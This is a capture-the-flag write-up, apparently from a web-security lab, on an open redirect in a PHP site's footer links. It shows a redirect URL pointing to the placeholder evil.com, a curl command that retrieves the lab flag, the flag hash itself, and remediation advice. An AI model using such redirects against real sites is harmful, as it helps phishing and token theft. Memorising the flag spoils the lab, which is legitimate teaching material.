# Open Redirect

## Breach Type
**Open Redirect / Unvalidated Redirects** — OWASP Top 10: A01:2021 Broken Access Control

## What is this Vulnerability?
**Open Redirect** is a vulnerability where a web application accepts a user-controlled parameter to redirect users to an external URL **without proper validation**. The application acts as a trusted "middleman" that redirects visitors anywhere the attacker wants.

In simple terms: the website has a link like `example.com/redirect?url=facebook.com` that redirects users to Facebook. An attacker changes it to `example.com/redirect?url=evil-phishing-site.com`. Because the link starts with `example.com` (a trusted domain), the victim clicks it without suspicion — and gets redirected to a phishing page that looks identical to the real site.

### Why is it dangerous?
- **Phishing attacks**: Attackers craft URLs that start with the trusted domain, making phishing links look legitimate
- **Credential theft**: Users trust the initial domain name and enter their credentials on the fake page
- **Malware distribution**: The redirect can lead to drive-by download sites
- **OAuth token theft**: Open redirects can be chained with OAuth flows to steal authorization tokens
- **Bypasses URL filters**: Security tools that whitelist the trusted domain will allow the malicious link through

### Real-world impact
Open redirects have been found in Google, Facebook, and PayPal. These are often used in targeted phishing campaigns because security-aware users check the domain in links before clicking — and a link starting with `paypal.com/redirect?url=...` looks trustworthy.

## Where
URL: `http://<IP>/index.php?page=redirect&site=http://evil.com`
The social media links in the footer (Facebook, Twitter, Instagram).

## How I Found It
1. In the footer of the website, there are social media icons linking to:
   - `index.php?page=redirect&site=facebook`
   - `index.php?page=redirect&site=twitter`
   - `index.php?page=redirect&site=instagram`
2. The `site` parameter controls where the user is redirected.
3. Tested by replacing the value with an arbitrary URL: `site=http://evil.com`.
4. The server accepted it and returned a flag, proving the redirect is not validated.

## Step-by-Step Exploitation

### Step 1: Identify the Redirect Endpoint
```
http://<IP>/index.php?page=redirect&site=facebook
```

### Step 2: Inject Arbitrary URL
```
http://<IP>/index.php?page=redirect&site=http://evil.com
```

### Step 3: Get the Flag
```bash
curl -s "http://<IP>/index.php?page=redirect&site=http://evil.com" | grep -i flag
```
Result:
```
Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
```

## Flag
```
b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
```

## How to Test Manually
1. Open your browser
2. Go to: `http://<IP>/index.php?page=redirect&site=http://evil.com`
3. The flag is displayed on the page

## How to Fix
- **Whitelist** allowed redirect destinations (only allow `facebook`, `twitter`, `instagram`)
- Map shortnames to full URLs server-side: `$urls = ['facebook' => 'https://facebook.com', ...]`
- Never allow user-controlled full URLs in redirect parameters
- If dynamic redirects are needed, validate against a list of trusted domains
- Use **relative URLs** instead of absolute URLs

## OWASP Reference
- [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
